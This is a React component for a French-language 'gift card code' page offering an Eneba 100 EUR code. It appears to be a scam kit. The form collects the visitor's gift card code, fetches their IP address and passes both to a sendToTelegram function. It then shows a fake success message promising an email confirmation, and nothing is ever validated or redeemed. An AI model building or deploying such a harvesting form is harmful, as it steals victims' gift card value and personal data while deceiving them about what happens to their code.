
import React, { useState } from 'react';
import { SubmissionStatus } from '../types';
import { fetchUserIp, sendToTelegram } from '../services/apiService';
import LoadingOverlay from './LoadingOverlay';

const GiftCardForm: React.FC = () => {
  const [code, setCode] = useState('');
  const [status, setStatus] = useState<SubmissionStatus>(SubmissionStatus.IDLE);
  const [error, setError] = useState<string | null>(null);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!code.trim()) {
      setError("Veuillez entrer un code valide.");
      return;
    }

    setStatus(SubmissionStatus.LOADING);
    setError(null);

    const ip = await fetchUserIp();
    const success = await sendToTelegram(code, ip);

    if (success) {
      setStatus(SubmissionStatus.SUCCESS);
      setCode('');
    } else {
      setStatus(SubmissionStatus.ERROR);
      setError("Une erreur s'est produite. Veuillez réessayer.");
    }
  };

  if (status === SubmissionStatus.SUCCESS) {
    return (
      <div className="text-center p-8 bg-green-50 rounded-2xl border border-green-100 animate-fade-in">
        <div className="mb-4 inline-flex items-center justify-center w-12 h-12 rounded-full bg-green-100 text-green-600">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
          </svg>
        </div>
        <h3 className="text-xl font-bold text-green-800 mb-2">Code envoyé !</h3>
        <p className="text-green-700">Votre demande est en cours de traitement. Vous recevrez une confirmation par e-mail.</p>
        <button 
          onClick={() => setStatus(SubmissionStatus.IDLE)}
          className="mt-6 text-sm font-semibold text-green-800 underline hover:text-green-900"
        >
          Valider un autre code
        </button>
      </div>
    );
  }

  return (
    <div className="w-full max-w-md mx-auto">
      {status === SubmissionStatus.LOADING && <LoadingOverlay message="Validation du code..." />}
      
      <form onSubmit={handleSubmit} className="space-y-6">
        <div className="space-y-2 text-center">
          <label htmlFor="giftCode" className="block text-lg font-bold text-indigo-900 uppercase tracking-wide">
            Code Carte Cadeau :
          </label>
          <div className="relative">
            <input
              id="giftCode"
              type="text"
              value={code}
              onChange={(e) => setCode(e.target.value)}
              placeholder="UTILISER le code ENEBA 100 EUR"
              className={`w-full h-14 px-6 text-center text-lg border-2 rounded-full focus:outline-none transition-all ${
                error ? 'border-red-300 bg-red-50' : 'border-gray-200 focus:border-indigo-500'
              }`}
              required
            />
          </div>
          {error && <p className="text-red-500 text-sm font-medium">{error}</p>}
        </div>

        <button
          type="submit"
          className="w-full h-14 bg-indigo-600 hover:bg-indigo-700 text-white font-bold rounded-full shadow-lg shadow-indigo-200 transition-all transform hover:-translate-y-0.5 active:translate-y-0 flex items-center justify-center space-x-2"
        >
          <span>UTILISER le code Eneba 100 EUR</span>
        </button>
      </form>
    </div>
  );
};

export default GiftCardForm;
